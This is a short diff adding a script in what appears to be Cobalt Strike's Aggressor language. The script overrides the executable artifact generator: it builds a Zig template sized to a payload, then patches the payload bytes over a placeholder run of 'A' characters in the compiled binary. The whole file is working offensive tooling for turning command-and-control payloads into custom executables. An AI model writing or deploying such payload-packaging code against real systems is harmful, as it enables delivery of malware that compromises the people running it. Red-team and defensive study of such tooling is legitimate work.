@@ -1,0 +1,37 @@
+set EXECUTABLE_ARTIFACT_GENERATOR {
+    $zigPath = "<FULL_PATH_TO_ZIG_BINARY>";
+    $repoPath = "<FULL_PATH_TO_REPO_DIRECTORY>";
+
+
+    $length = strlen($2);
+    $buildCommand = $zigPath . " build -DpayloadSize=" . $length;
+    println("Building template for size : " . $length);
+    println("Build command : " . $buildCommand);
+    $buildHandle = exec($buildCommand, $null, $repoPath); 
+    @data = readAll($buildHandle);
+    closef($buildHandle);
+
+    $path = getFileProper($repoPath . "/zig-out/bin/", $1);
+    println("Searching " . $path);
+    if (!-exists $path) {
+      println("Could not find custom " . $1);
+      return $null;
+    }
+
+    $handle = openf($path);
+    $template = readb($handle, -1);
+    closef($handle);    
+
+    $index = indexOf($template, 'A' x $length);
+    println("A's start @ " . $index);
+
+    $buffer = allocate(1024);
+    for ($i = 0; $i < $length; $i++) {
+        writeb($buffer, chr((byteAt($2, $i))));
+    }
+    closef($buffer);
+    
+    $b = readb($buffer, -1);
+
+    return replaceAt($template, $b, $index);
+}
